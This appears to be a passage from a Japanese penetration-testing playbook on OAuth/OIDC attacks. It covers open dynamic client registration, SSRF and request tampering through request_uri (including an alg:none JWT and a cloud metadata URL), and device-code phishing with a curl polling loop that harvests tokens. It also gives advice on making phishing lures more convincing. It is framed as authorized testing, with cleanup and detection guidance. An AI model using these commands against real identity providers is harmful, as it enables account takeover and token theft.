| 200 + `client_id` 返却 | dynamic registration が認証なしで開いている | client_id で victim を authorize に誘導 |
| 401 / 403 | 認証必須 | 既存の credentials があれば再試行、なければ §1 redirect_uri バイパスへ戻る |
| 400 `redirect_uris invalid` | redirect_uri にホワイトリストあり | 攻撃者ドメインを victim 関連の見せかけのサブドメインにする |
| 登録成功するが victim が同意画面で不審に思う | client_name に偽装 | `client_name` を victim 組織のサービス名に似せる（フィッシング要素） |

**注意:** **原状回復必須**: 登録した client は使用後に `/connect/register/[CLIENT_ID]` への DELETE で削除（実装依存）。テスト識別子コメントマーカー `kedalab-[CASE_ID]` を `client_name` に含めて、grep で識別できるようにしておく。Dynamic Client Registration の存在自体は機能要件で正常だが、**認証なしで開いている**ことが脆弱性。RFC 7591 では `initial_access_token` を要求するのが標準的。

---

## 10. request_uri / request object 経由の SSRF・認可リクエスト改ざん

**前提:** OIDC で `request_uri` パラメータ（RFC 6749 / OIDC Core §6）が許容されており、authorize 時に攻撃者制御 URL から request object（署名済み JWT）を fetch する実装の場合に成立。SSRF として悪用するか、認可パラメータを動的に差し替える。

**事前準備（必須）:**

1. 着火条件で取得した discovery JSON で `request_uri_parameter_supported: true` を確認
2. 攻撃者制御 HTTP サーバから request object（JWT）を返せること

**コマンド:**

```bash
# [Attacker] request object (JWT) を生成して攻撃者 HTTP サーバに配置
python3 -c "
import jwt
req = jwt.encode({
    'response_type': 'code',
    'client_id': '[CLIENT_ID]',
    'redirect_uri': 'https://[ATTACKER_DOMAIN]/callback',
    'scope': 'openid email profile admin:read'
}, '', algorithm='none')
print(req)
" > /tmp/req.jwt

# [Attacker] HTTP サーバで配信
python3 -m http.server 8080 --directory /tmp

# [Attacker] authorize に request_uri を指定
# https://[AUTH_SERVER]/oauth/authorize?
#   client_id=[CLIENT_ID]&
#   request_uri=https://[ATTACKER_DOMAIN]:8080/req.jwt

# [Attacker] SSRF 用途: 内部ホストの URL を request_uri に渡す
# request_uri=http://169.254.169.254/latest/meta-data/  ← AWS メタデータ
# request_uri=http://localhost:8080/admin               ← 内部管理画面
```

**観測される出力 → 次のアクション:**

| サーバの応答 / 観測 | 示唆 | 次のアクション |
|---|---|---|
| 攻撃者 HTTP サーバに GET /req.jwt が記録 | 認可サーバが request_uri を fetch している | 認可パラメータ動的差し替え成立 → §1 と同様 code 奪取 |
| 同上 + ヘッダに `User-Agent: [AUTH_SERVER_NAME]` | サーバ側 fetch 確定 | SSRF 用途で内部 URL を試す |
| 内部 URL で認可サーバが応答返却に変化 | SSRF 成立 | `SSRF.md` のペイロード（`http://169.254.169.254/` 等）を流用 |
| `invalid request_uri` | request_uri が pre-registered URL に限定 | pre-registered URI のサブストリングマッチを §1.1 同様試す |
| `request object signing failed` | request object の `alg` 制限あり | `alg:none` 拒否、`JWT_Attacks.md` の HS256 ブルートに切替 |

**注意:** `request_uri` は OIDC Core §6.2 で定義された機能で、本来は client_secret を持たない public client が request object を再利用する用途。**SSRF と認可リクエスト改ざんの 2 つの攻撃面**を持つため、認可サーバ側で pre-registered URL に限定するのが推奨実装。Microsoft Entra ID 等の主要 IdP では `request_uri` を pre-registered URL に限定する対策が標準化されているが、自前実装 OIDC では残存することがある。後発の **RFC 9101（JWT-Secured Authorization Request, JAR）** では `request` パラメータ（外部 URL fetch なしの inline JWT）または PAR（RFC 9126, Pushed Authorization Requests）の利用を推奨し、`request_uri` 外部 fetch の利用を縮小する方向。攻撃者視点では、JAR / PAR が導入されている認可サーバでは request object の `alg` 制限（`none` 禁止・登録 alg のみ許容）が厳しいことが多いため、§7 の JWT 攻撃に切り替える判断材料になる。

---

## 11. Device Code Phishing（OAuth 2.0 Device Authorization Grant の悪用）

**前提:** `device_authorization_endpoint`（RFC 8628 Device Authorization Grant）が discovery JSON で公開されているか、対象組織が Microsoft 365 / GitHub / Google Workspace などの**device code フロー対応 SaaS** を使っていて、攻撃者が user_code をフィッシング経由で被害者に入力させられる場合に成立。**Microsoft / GitHub 等で実害例あり**（**Storm-2372**（Russia-linked、2024 年 8 月から活動・Microsoft Threat Intelligence が 2025-02-13 に公表）が Microsoft Teams 等の lure で device code phishing を実施し、政府・NGO・IT・防衛・通信・医療・高等教育・エネルギー部門を標的に access/refresh token を取得）。

**攻撃シナリオ:**

1. 攻撃者が `device_authorization_endpoint` に POST して `device_code` + `user_code` + `verification_uri` を取得
2. 被害者にフィッシングメール / 偽サイト / 偽 Teams メッセージで「以下のコードを `https://microsoft.com/devicelogin` に入力してください」と誘導
3. 被害者は正規ドメインで自分の認証情報を入力し、user_code を承認
4. 攻撃者は `token_endpoint` で `grant_type=urn:ietf:params:oauth:grant-type:device_code` + `device_code` を polling し、access_token / refresh_token を取得
5. **被害者は何も気付かない**（攻撃者のセッションが裏で確立される）

**事前準備（必須）:** discovery JSON で `device_authorization_endpoint` の URL を取得。Microsoft の場合は `https://login.microsoftonline.com/[TENANT_ID]/oauth2/v2.0/devicecode`。

**コマンド:**

```bash
# [Attacker] 1. device code を取得
curl -X POST https://[AUTH_SERVER]/oauth/device_authorization \
  -d "client_id=[CLIENT_ID]" \
  -d "scope=openid email profile offline_access"
# レスポンス例:
# {
#   "device_code": "[DEVICE_CODE]",
#   "user_code": "ABCD-EFGH",
#   "verification_uri": "https://[AUTH_SERVER]/device",
#   "verification_uri_complete": "https://[AUTH_SERVER]/device?user_code=ABCD-EFGH",
#   "expires_in": 900,
#   "interval": 5
# }

# [Attacker] 2. user_code を被害者にフィッシング経由で入力させる
# verification_uri_complete を QR コード化してメール / Teams で配信するのが典型

# [Attacker] 3. token endpoint を polling（interval 秒ごと）
while true; do
  RESP=$(curl -s -X POST https://[AUTH_SERVER]/oauth/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "device_code=[DEVICE_CODE]" \
    -d "client_id=[CLIENT_ID]")
  echo "$RESP" | grep -q access_token && { echo "$RESP"; break; }
  sleep 5
done
# 被害者が承認すると access_token + refresh_token が返る
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| `authorization_pending` | 被害者が未承認 | polling 継続 |
| 200 + access_token + refresh_token | 被害者が承認 → フィッシング成立 | refresh_token で長期アクセス維持・対象 API（Graph API / GitHub API 等）を叩く |
| `expired_token` | 15 分の expires_in 超過 | device code を再発行して攻撃を再実行 |
| 400 `unauthorized_client` | client_id が device code フロー非対応 | 別の first-party client_id（Microsoft 公式の Azure CLI / PowerShell の client_id 等が悪用される）を試す |
| 着信なし（被害者が踏まない） | フィッシング誘導失敗 | 偽装の信頼性を上げる（社内らしき文面・正規 SaaS のロゴ・短縮 URL 回避） |

**注意:** Device code フローは **CLI / IoT / TV など入力が貧弱な端末向け**の正規機能で、攻撃面は「user_code がランダム短文字列なのを利用してフィッシングする」点。**Microsoft Entra ID では Conditional Access policy で device code フローを Block できる**ようになっており、本番組織で device code phishing リスクが高い場合は Conditional Access での mitigation を推奨。攻撃者視点では、organization の Conditional Access 設定を事前に偵察できない場合は試行価値あり。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| §1 redirect_uri を変えると 400 が返る | 完全一致検証されている | §1.2 path traversal / §1.3 HPP / §1.4 ホスト表記揺らぎを試す。それも通らなければ §3 Implicit Flow の有無を確認 |
| §2 state が空でも CSRF 不成立 | callback 側でセッション・nonce と紐付けて検証 | 同セッション内 race condition / 別タブからの authorize 起動を試す |
| §4 scope 拡大で `invalid_scope` | scope 検証あり | `scopes_supported` から別 scope 名、§1 redirect_uri バイパスで完全な再認可を試行 |
| §5 PKCE 必須化されている | public client では順当な実装 | confidential client 側（§8 client_secret）に攻撃面を移す |
| §6 email_verified 検証されている | 攻撃者制御 IdP シナリオは封じ | 同 IdP 内で email 変更 + 再認証で `email_verified=true` を取り直せる IdP を探す（nOAuth 型） |
| §7 id_token の `alg:none` が拒否される | 署名検証あり | `JWT_Attacks.md` §3〜§8、OIDC 固有として `aud` 別 client_id で他テナント向けトークン流用 |
| §8 client_secret が JS バンドルに無い | BFF パターン使用中 | BFF サーバ側の脆弱性に攻撃面を移す |
| §9 dynamic registration が 401 | 認証必須 | 既存 credentials があれば再試行、なければ §1 経路へ |
| §10 request_uri が pre-registered URL 限定 | URL ホワイトリスト | サブストリングマッチを §1.1 同様試す |
| §11 device code フローが client_id で拒否 | client_id が device code 非対応 | first-party client_id（Azure CLI / PowerShell / GitHub CLI など）を試す。組織の Conditional Access policy で block されている場合は諦め |
| 全パターンで通らない | 認可フロー自体は堅牢 | 発行されたトークンの取り扱い（リソース API の scope 検証・トークン保存場所）に攻撃面を移す |

## 注意点・落とし穴

> **[HIGH IMPACT]** §1 / §2 / §6 / §7 / §9 はアカウント乗っ取りに直結するため本番では事前合意必須:
> - [x] **認証バイパス・アカウント乗っ取りに該当**（権限境界の侵害）
> - [x] **§2 は持続化に該当**（攻撃者の IdP 連携を解除しないと残る）
> - [ ] 不可逆な設定変更
> - [x] SIEM / EDR で確実に検知される（認可サーバのアクセスログ、`redirect_uri` の異常値、短時間に複数の `client_id` への authorize 試行）
>
> 実施可否は事前合意で明示確認すること。被害者役のテストアカウントが用意されているか、攻撃者役のアカウント連携を試してよいかを事前確認。**§2 / §9 で作成した連携・client は原状回復必須**。演習環境（HTB / OSCP 等）では制約なし。

- **OAuth はフレームワーク・SaaS ごとに「拡張」があり挙動が異なる** → Auth0 / Okta / Keycloak / AWS Cognito / Firebase Auth / Azure AD（Entra ID）/ Google Identity / Apple Sign In それぞれの quirks がある。Apple Sign In は email を private relay で隠す機能があり、`email_verified` の解釈が独自
- **fragment（`#`）はサーバログに残らない** → §3 Implicit Flow の access_token 漏洩を server-side ログだけで確認しようとすると検出できない。ブラウザ DevTools / Burp HTTP history で確認する
- **authorization code は通常 1 回しか使えない** → 攻撃者が先に消費してしまうと被害者側でエラーになり気付かれる。§1 では被害者が踏む前に消費しない / §2 では被害者セッションで消費されるので問題ない
- **id_token と access_token を混同しない** → id_token は OIDC の認証結果の証明（JWT、client が検証）、access_token はリソース API の認可（resource server が検証）。攻撃面が違う
- **`prompt=none` の挙動** → SSO セッションが有効なら同意画面を出さずに即 code を返す。「被害者がログイン中か」を判定するログイン状態オラクルにもなる。**iframe 内で `prompt=none` の authorize を連続実行**すると、被害者の SSO セッションを使って気付かれずに code を取得できる経路があり、X-Frame-Options / framing 制限が緩い callback と組み合わせると深刻。`response_mode=form_post` を使うと code が POST body で返るためログ / Referer に残らない点も併せて確認
- **`response_mode` の悪用** → authorize 時に `response_mode=form_post` / `web_message` 等を指定できる場合、callback ページの処理実装が甘いと XSS / postMessage origin 不検証で token を別 origin に流せるケースがある。callback ハンドラの実装をコード or Burp 経由で必ず確認
- **redirect_uri は authorize 時と token 交換時で完全一致が必要** → §1 で code を奪っても token 交換時に元の redirect_uri を指定する必要がある
- **モバイル app の custom URL scheme は OS レベルで保証されない** → 同 scheme を登録した別 app が起動順序で先に受け取る可能性。Universal Links / App Links 推奨だが未対応のアプリも多い
- **個別ブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロック横断の警告のみ。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §1 / §2 / §6 / §7 / §9 は認証バイパス・アカウント乗っ取りに該当）/ ★★（口頭確認可 — 着火条件・先に確認すること（偵察相当）、§3 Implicit Flow 観察、§8 client_secret 探索）/ ★（§4 / §5 / §10 は技術的判断のみで実施可だが、対象組織との合意範囲確認）
- **想定される SIEM / EDR 検知**: 認可サーバのアクセスログ（`redirect_uri` の異常値・短時間に複数の `client_id` への authorize 試行）/ token endpoint への異常リクエスト / dynamic registration ログ / userinfo への異常 scope パラメータ / `request_uri` への外部 fetch
- **業務影響リスク**: 中（攻撃者のソーシャル ID を被害者アカウントに紐付けた状態のまま放置するとログイン乗っ取りが残る）/ §9 で作成した client が認可サーバに残り続けると永続バックドア
- **原状回復必須項目**:
  - ✅ §2 で被害者役アカウントに紐付けた攻撃者の IdP 連携を解除
  - ✅ §9 で登録した動的 client を `client_name` の `kedalab-[CASE_ID]` で識別して DELETE
  - ✅ §8 で取得した client_secret は暗号化保管・テスト完了時破棄
  - ✅ 検証中に発行したアクセストークン・リフレッシュトークンを revoke
  - ✅ §10 で起動した攻撃者 HTTP サーバの停止
- **取得情報の取扱**: id_token・access_token・client_secret は全て認証情報扱い、暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web 列挙で OAuth エンドポイントを発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：レスポンス一次トリアージで id_token / access_token を検出 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：id_token 詳細検証バイパス（alg / kid / jku / jwk 攻撃）→ `JWT_Attacks.md`
- 後：認証バイパス成立後の API 列挙・権限昇格 → `IDOR.md`
- 後：偽造トークンで到達した管理機能経由のコマンド実行 → `Command_Injection.md`
- 関連：§3 Implicit Flow の token 漏洩経路として XSS が起点になる場合 → `XSS.md`
- 関連：§1.2 redirect_uri バイパスで Open Redirect を連鎖する場合 → `Open_Redirect.md`
- 関連：§10 request_uri 経由の SSRF 詳細ペイロード → `SSRF.md`
- 関連：§5 PKCE 欠落時のリスナー準備 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）
